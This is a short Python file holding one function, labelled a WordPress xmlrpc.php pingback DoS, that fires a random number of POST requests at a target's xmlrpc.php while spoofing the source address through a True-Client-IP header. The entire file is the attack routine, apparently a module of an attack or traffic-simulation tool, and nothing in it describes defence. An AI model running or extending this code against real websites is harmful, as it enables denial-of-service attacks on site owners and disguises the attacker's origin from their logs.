import random
import requests

# wordpress xmlrpc.php / pingback DoS
def wordpress_xmlrpc_dos(target, source_ip, user_agent, **kwargs):

    attack = {
                  "method": "POST",
                  "url": "{}/xmlrpc.php".format(target),
                  "payload": "pingback.ping"
                  }

    headers = {'User-Agent': user_agent,
               'True-Client-IP': str(source_ip),
               'Content-Type': 'application/x-www-form-urlencoded'
              }

    count=random.randint(1,20)

    for i in range(count):
        response = requests.request(attack['method'], attack['url'], headers=headers, data=attack['payload']).status_code

    return("wordpress_xmlrpc_dos: sent {} requests to {}".format(count,attack['url']))
